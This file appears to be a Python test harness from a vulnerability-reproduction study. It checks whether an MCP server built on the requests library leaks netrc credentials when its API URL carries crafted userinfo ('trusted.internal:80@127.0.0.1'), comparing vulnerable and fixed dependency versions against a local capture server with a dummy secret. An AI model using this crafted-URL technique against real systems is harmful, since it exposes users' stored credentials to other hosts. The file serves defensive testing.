from __future__ import annotations
import argparse
import base64
import json
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any
from shared_host_runner import evidence_rows, run_shared_host_case
CASE_ID = 'GH-P3-093-datris-mcp-requests-netrc'
SECRET = 'GT_P3_093_NETRC_SECRET_7K2M'
TOKEN = 'trusted.internal:80'
BOUNDARY_MARKER = 'GH_P3_093_DATRIS_VERSION_READBACK'
TARGET_PORT = 18093

class ApiBoundary:

    def __init__(self) -> None:
        self.requests: list[dict[str, Any]] = []
        boundary = self

        class Handler(BaseHTTPRequestHandler):

            def do_GET(self) -> None:
                headers = dict(self.headers)
                boundary.requests.append({'method': self.command, 'path': self.path, 'headers': headers})
                body = json.dumps({'authorization': headers.get('Authorization', ''), 'boundary_marker': BOUNDARY_MARKER}).encode('utf-8')
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.send_header('Content-Length', str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *_args: object) -> None:
                return
        self.server = ThreadingHTTPServer(('127.0.0.1', TARGET_PORT), Handler)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)

    def start(self) -> None:
        self.thread.start()

    def close(self) -> None:
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=3)

    def snapshot(self) -> dict[str, Any]:
        return {'boundary': 'container-local-datris-api-readback', 'requests': list(self.requests)}

def write_json(path: Path, value: Any) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(value, ensure_ascii=False, indent=2) + '\n', encoding='utf-8')

def result_text(record: dict[str, Any]) -> str:
    content = record.get('mcp', {}).get('normalized_result', {}).get('content', [])
    if not isinstance(content, list):
        return ''
    return '\n'.join((item.get('text', '') for item in content if isinstance(item, dict)))

def l4_tool_text(record: dict[str, Any]) -> str:
    request = record.get('model', {}).get('next_request', {})
    if not isinstance(request, dict):
        return ''
    for message in request.get('messages', []):
        if isinstance(message, dict) and message.get('role') == 'tool':
            content = message.get('content', [])
            if isinstance(content, list):
                return '\n'.join((item.get('text', '') for item in content if isinstance(item, dict)))
    return ''

def reflected_credential(text: str) -> str:
    try:
        payload = json.loads(text)
        authorization = payload.get('authorization', '')
        if isinstance(authorization, str) and authorization.startswith('Basic '):
            return base64.b64decode(authorization[6:]).decode('utf-8')
    except (TypeError, ValueError, json.JSONDecodeError):
        pass
    return ''

def boundary_credentials(snapshot: dict[str, Any]) -> list[str]:
    values: list[str] = []
    for item in snapshot.get('requests', []):
        headers = item.get('headers', {}) if isinstance(item, dict) else {}
        authorization = headers.get('Authorization') if isinstance(headers, dict) else None
        if isinstance(authorization, str) and authorization.startswith('Basic '):
            try:
                values.append(base64.b64decode(authorization[6:]).decode('utf-8'))
            except (ValueError, TypeError):
                values.append('')
    return values

def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument('--spec', type=Path, required=True)
    parser.add_argument('--output', type=Path, required=True)
    parser.add_argument('--side', choices=('vulnerable', 'fixed'), required=True)
    parser.add_argument('--repetition', type=int, required=True)
    args = parser.parse_args()
    spec = json.loads(args.spec.read_text(encoding='utf-8'))
    boundary = ApiBoundary()
    boundary.start()
    netrc_path = Path('/tmp/gt-netrc')
    netrc_path.write_text(f"""machine trusted.internal login gt-user password {SECRET}\n""", encoding='utf-8')
    netrc_path.chmod(384)
    side_version = spec['direct_runtime_dependency']['vulnerable_version' if args.side == 'vulnerable' else 'fixed_version']
    env = {'PYTHONPATH': f"""/opt/common-deps:/opt/side-deps/{args.side}:/opt/deps/vulnerable:/opt/gt""", 'DATRIS_API_URL': f"""http://trusted.internal:80@127.0.0.1:{TARGET_PORT}""", 'HOME': '/tmp/gt-home', 'NETRC': str(netrc_path), 'NO_PROXY': '*', 'no_proxy': '*', 'HTTP_PROXY': '', 'HTTPS_PROXY': '', 'ALL_PROXY': '', 'http_proxy': '', 'https_proxy': '', 'all_proxy': '', 'PYTHONIOENCODING': 'utf-8'}
    try:
        record = run_shared_host_case(run_id=f"""{CASE_ID}-{args.side}-{args.repetition}""", case_id=CASE_ID, revision=args.side, repetition=args.repetition, command=['python3', '/opt/gt/stdio_server.py'], cwd=Path('/workspace/source/mcp-server'), env=env, server_name=spec['discovery']['repository_url'], tool_name=spec['mcp_path_review']['tool'], tool_arguments=spec['mcp_path_review']['tool_arguments'], task=spec['experiment']['agent_task'], system_prompt='You are a deterministic research host. Use the frozen tool call and report only its returned Tool result.', server_revision=f"""{spec['discovery']['repository_commit']}; requests=={side_version}""", timeout=60)
        snapshot = boundary.snapshot()
        record['external_boundary'] = snapshot
        tool = result_text(record)
        l4 = l4_tool_text(record)
        credentials = boundary_credentials(snapshot)
        record['gh_p3_093_probe'] = {'effect_type': 'SENSITIVE_INFORMATION_DISCLOSURE', 'boundary_marker': BOUNDARY_MARKER, 'secret': SECRET, 'tool_reflected_credential': reflected_credential(tool), 'l4_reflected_credential': reflected_credential(l4), 'boundary_credentials': credentials, 'boundary_marker_in_tool': BOUNDARY_MARKER in tool, 'boundary_marker_in_l4': BOUNDARY_MARKER in l4, 'input_secret_absent': SECRET not in json.dumps(spec['mcp_path_review']['tool_arguments'], ensure_ascii=False), 'url_userinfo_fallback': TOKEN}
        args.output.mkdir(parents=True, exist_ok=True)
        write_json(args.output / 'host_record.json', record)
        (args.output / 'evidence.jsonl').write_text(''.join((json.dumps(row, ensure_ascii=False) + '\n' for row in evidence_rows(record))), encoding='utf-8')
        write_json(args.output / 'boundary_snapshot.json', snapshot)
        valid = record['quality']['invalid_run'] is False and all((value == 'observed' for value in record['evidence_levels'].values()))
        print(json.dumps({'status': 'OK' if valid else 'INVALID', 'output': str(args.output)}, ensure_ascii=False))
        return 0 if valid else 1
    finally:
        boundary.close()
if __name__ == '__main__':
    raise SystemExit(main())
